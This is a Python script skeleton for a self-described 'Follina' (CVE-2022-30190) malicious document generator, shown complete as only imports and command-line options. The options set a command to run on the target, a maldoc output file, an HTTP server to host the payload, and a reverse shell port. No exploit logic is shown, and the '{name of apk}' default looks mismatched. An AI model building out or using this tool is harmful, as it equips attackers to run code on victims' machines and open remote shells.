#!/usr/bin/env python3

import argparse
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading
import zipfile
import sys

help_text = '''CVE-2022-30190 Generator Malware Follina
This is for educational use only! 
'''

parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default="{name of apk}",
    help="command to run on the target",
)

parser.add_argument(
    "--output",
    "-o",
    default="./follina.doc",
    help="output maldoc file",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8082",
    help="port to serve the HTTP server",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="0",
    help="port to serve reverse shell on",
)

parser.add_argument(
    "--version",
    "-v",
    default="Follina Version 0.1"
)
